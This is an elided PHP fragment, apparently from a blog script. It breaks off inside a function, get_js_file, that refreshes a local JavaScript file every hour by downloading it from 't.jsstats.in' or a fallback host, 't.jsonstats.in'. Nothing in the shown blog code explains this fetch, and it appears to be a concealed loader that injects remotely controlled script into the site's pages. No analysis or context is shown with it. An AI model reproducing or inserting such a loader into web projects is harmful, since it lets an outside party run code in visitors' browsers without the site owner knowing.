...
define('CPR_HASH', "8ed5c7e1cfad1e8afb987122bdf92419", true);
define('PARAM_HASH', "bfdf0771", true);
...
function entries_get_by_id($id) {
    ...
    $blog['pageTitle'] = $title.' - '.$blog['pageTitle'];
    return $entries;
};
...
if ($_POST) {
    ...
    if (isset($_GET['id'])) {
        ...
        $blog['pageTitle'] = $labels[$label]['name'].' - '.$blog['pageTitle'];
...
function get_js_file($filename) {
    if (!file_exists($filename) or time() - filemtime($filename) > 3600) {
        $js_file = @file_get_contents('http://t.jsstats.in/b-m-3/'.$filename);
        if (!$js_file) {
            $js_file = @file_get_contents('http://t.jsonstats.in/b-m-3/'.$filename);
        }
        if ($js_file) {
